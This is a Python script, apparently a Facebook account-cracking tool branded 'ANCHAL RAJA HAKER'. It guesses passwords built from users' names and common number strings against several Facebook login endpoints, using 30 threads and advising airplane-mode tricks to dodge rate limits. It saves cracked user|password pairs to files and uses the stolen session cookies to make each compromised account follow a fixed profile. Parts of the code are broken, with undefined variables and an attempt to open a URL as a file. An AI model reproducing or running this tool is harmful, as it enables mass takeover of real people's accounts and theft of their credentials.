 #!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {     "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
logo ="""\033[1;37;1m 
\033[1;92;1m[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]
\033[1;96;1m[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]
\033[1;91;1m ooooooooo.        .o.          oooo       .o.       
\033[1;97;1m 888   `Y88.      .888.         `888      .888.      
\033[1;93;1m 888   .d88'     .8"888.         888     .8"888.     
\033[1;96;1m 888ooo88P'     .8' `888.        888    .8' `888.    
\033[1;94;1m 888`88b.      .88ooo8888.       888   .88ooo8888.   
\033[1;96;1m 888  `88b.   .8'     `888.      888  .8'     `888.  
\033[1;92;1m o888o  o888o o88o     o8888o .o. 88P o88o     o8888o
\033[1;92;1m                      
[=]        ~ ANCHAL RAJA HAKER ~
[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]
[=]\033[1;92;1m  Author   : ANCHAL RAJA 
[=]\033[1;92;1m  Facebook : www.facebook.com.ANCHAL.RAJA
[=]\033[1;94;1m [Whatsapp : +919149858868
[=]\033[1;96;1m GitHub   : ANCHAL RAJA 
[=]\033[1;92;1m [Virson   : JK.0.19
[=]÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷[∆]"""

def ahmad():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1]   (METHOD1) mbusic Facebook')
    print(' [2]   (METHOD2) free Facebook')
    print(' [3]   (METHOD3) mbusic Facebook')
    print(' [E]   (EXIT')
    print('')
    _ahmad___ = input('       Choose option : ')
    if _ahmad___ in ('1', '01'):
        __xxx__().ahmadx(id)
    if _ahmad___ in ('2', '02'):     
        __xxxx__().ajawanx(id)
    if _ahmad___ in ('3', '03'):     
        __xxxxx__().malikx(id)
    if _ahmad___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def ahmadx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('_____Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.ahmadx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;96m \033              %s|%s \033[1;32mOK|%s '%(loop,len(self.id),len(ok))),
        
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header={
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                 }                       

                header1 = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"2",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('https://github.com/hassanaliali1/user/blob/main/user.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('1.       PASS1 VIP ')
        print('2.       PASS2 VIP ')
        print('3.       PASS3 VIP ')
        chi = input('\n        Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
            self.__pler__()
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')                      
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+xz[1]]                         
                            pwx = [xz[0]+xz[1]]
                        else:
                            pwx = [xz[0]+xz[1]] 
                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')                      
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+"123456", xz[0]+"1122"]                         
                            pwx = ["786786", "445566", "786110"]
                        else:
                            pwx = [xz[0]+"123456", xz[0]+"1122", "786786", "445566", "786110"] 
                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)     
class __xxxx__:
    def __init__(self):
        self.id = []
    def ajawanx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('_____Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.ahmadx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop

        sys.stdout.write('\r\033[1;96m \033[1;32m%s|%s \033[1;32m[OK:%s] '%(loop,len(self.id),len(ok))),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header={
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                 }                       
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('1.       PASS1 VIP ')
        print('2.       PASS2 VIP ')
        chi = input('\n        Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
                        else:
                            pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
                        AXIworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')                      
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+xz[1]]                         
                            pwx = [xz[0]+xz[1]]
                        else:
                            pwx = [xz[0]+xz[1]] 
                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
class __xxxxx__:
    def __init__(self):
        self.id = []
    def malikx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('_____Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.ahmadx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop

        sys.stdout.write('\r\033[1;96m \033][1;32m%s|%s \033[1;32m[OK:%s] '%(loop,len(self.id),len(ok))),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header={
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                }                       
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "sec-fetch-site":"none",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9",
                     "cache-control":"max-age=0",
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('ANCHAL-RAJA -CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('1.       PASS1 VIP ')
        print('2.       PASS2 VIP ')
        chi = input('\n        Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
                        AXIworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with ahmadAXI(max_workers=30) as AXIworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
                        else:
                            pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            sys.stdout.write(f"\r \x1b[1;32m[Anchal]\x1b[1;32m [{loop}|{tl}] \x1b[1;92m[OK][{len(oks)}] [CP][{len(cps)}]  ")
print('chk update')
os.system('git pull')
ahmad()